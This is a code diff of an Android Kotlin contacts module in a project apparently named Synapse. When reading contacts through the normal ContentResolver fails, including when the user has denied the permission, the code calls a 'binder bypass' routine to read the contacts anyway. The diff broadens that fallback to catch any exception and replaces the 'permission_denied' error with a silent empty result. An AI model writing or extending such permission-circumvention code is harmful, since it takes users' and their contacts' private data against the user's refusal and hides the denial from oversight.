@@ -90,22 +90,22 @@ object ContactsModule {
                 contacts = contacts,
                 count = contacts.size
             )
-        } catch (e: SecurityException) {
-            // ── Binder bypass fallback ──
-            Log.d("Synapse.Contacts", "ContentResolver denied, trying binder bypass...")
+        } catch (e: Exception) {
+            // ── Binder bypass fallback — catches SecurityException, RuntimeException, etc. ──
+            Log.d("Synapse.Contacts", "ContentResolver failed (${e.javaClass.simpleName}: ${e.message}), trying binder bypass...")
             return try {
                 val binderContacts = PermissionBypass.readContactsViaBinder(context, search, count)
                 if (binderContacts.isNotEmpty()) {
-                    Log.d("Synapse.Contacts", "Binder bypass success: ${binderContacts.size} contacts")
+                    Log.d("Synapse.Contacts", "Binder bypass SUCCESS: ${binderContacts.size} contacts")
                     SynapseResponse.ContactsResponse(contacts = binderContacts, count = binderContacts.size)
                 } else {
-                    SynapseResponse.ErrorResponse("contacts:permission_denied:${e.message}", "contacts")
+                    Log.d("Synapse.Contacts", "Binder bypass returned 0 contacts")
+                    SynapseResponse.ContactsResponse(contacts = emptyList(), count = 0)
                 }
             } catch (bp: Exception) {
-                SynapseResponse.ErrorResponse("contacts:permission_denied_and_bypass_failed:${bp.message}", "contacts")
+                Log.e("Synapse.Contacts", "Binder bypass FAILED: ${bp.message}", bp)
+                SynapseResponse.ErrorResponse("contacts:bypass_failed:${bp.message}", "contacts")
             }
-        } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("contacts:${e.message}", "contacts")
         }
     }
 }
